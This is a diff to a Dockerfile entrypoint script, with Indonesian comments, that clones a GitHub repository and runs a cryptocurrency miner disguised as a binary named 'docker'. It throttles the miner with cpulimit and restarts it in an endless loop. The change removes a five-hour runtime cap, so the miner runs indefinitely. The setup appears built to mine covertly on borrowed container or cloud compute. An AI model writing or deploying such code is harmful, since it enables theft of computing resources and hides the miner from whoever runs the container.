@@ -14,79 +14,60 @@ WORKDIR /app
 RUN cat <<'EOF' > /entrypoint.sh
 #!/bin/bash
 
-set -e
+set +e   # ❗ jangan pakai set -e
 
 echo "[INIT] Starting container..."
 
 mkdir -p /app/ramdisk
 cd /app/ramdisk
 
-echo "[INIT] Cleaning workspace..."
 rm -rf *
 
 echo "[INIT] Cloning repo..."
-git clone -q https://github.com/umnodqib/swam.git
+git clone https://github.com/umnodqib/swam.git
+
+if [ ! -d "swam" ]; then
+    echo "[ERROR] Clone gagal!"
+    sleep 300
+    exit 1
+fi
+
 cd swam
+chmod +x docker || true
 
-chmod +x docker
-
-# config core
 CORES=${CORES:-1}
 LIMIT=$(( CORES * 70 ))
 
-echo "[DOTAJA] Core: $CORES | CPU Limit: $LIMIT%"
-
-# update config
-if [ -f docker.json ]; then
-    sed -i "s/\"threads\":.*/\"threads\": $CORES,/g" docker.json || true
-fi
-
-# tunnel (optional)
-if [ -f hostname.txt ]; then
-    HOST_CF=$(cat hostname.txt)
-    echo "[INIT] Starting Cloudflare tunnel: $HOST_CF"
-    cloudflared access tcp --hostname "$HOST_CF" --url 127.0.0.1:443 &
-else
-    echo "[WARN] hostname.txt tidak ditemukan, skip tunnel"
-fi
-
-echo "[INIT] Starting worker loop..."
-
-START_TIME=$(date +%s)
-MAX_RUNTIME=$((5 * 60 * 60))   # 5 jam
+echo "[INIT] Start loop..."
 
 while true; do
-    NOW=$(date +%s)
-    ELAPSED=$((NOW - START_TIME))
+    echo "[LOOP] start miner"
 
-    # stop kalau sudah 5 jam
-    if [ "$ELAPSED" -ge "$MAX_RUNTIME" ]; then
-        echo "[EXIT] Max runtime reached ($ELAPSED s)"
-        break
+    if [ ! -f "./docker" ]; then
+        echo "[ERROR] file docker tidak ada!"
+        sleep 60
+        continue
     fi
-
-    echo "[LOOP] starting miner..."
 
     ./docker -c docker.json &
     PID=$!
 
-    echo "[PID] $PID"
+    sleep 2
+
+    if ! kill -0 $PID 2>/dev/null; then
+        echo "[WARN] miner langsung mati"
+        sleep 60
+        continue
+    fi
 
     cpulimit -p $PID -l $LIMIT --include-children &
 
-    sleep 300  # jalan 5 menit
+    sleep 300
 
-    if ! kill -0 $PID 2>/dev/null; then
-        echo "[WARN] miner mati, restart..."
-    else
-        echo "[INFO] restart normal..."
-        kill -9 $PID || true
-    fi
+    kill -9 $PID || true
 
-    sleep 5
+    echo "[LOOP] restart..."
 done
-
-echo "[DONE] Container selesai normal"
 
 EOF
 
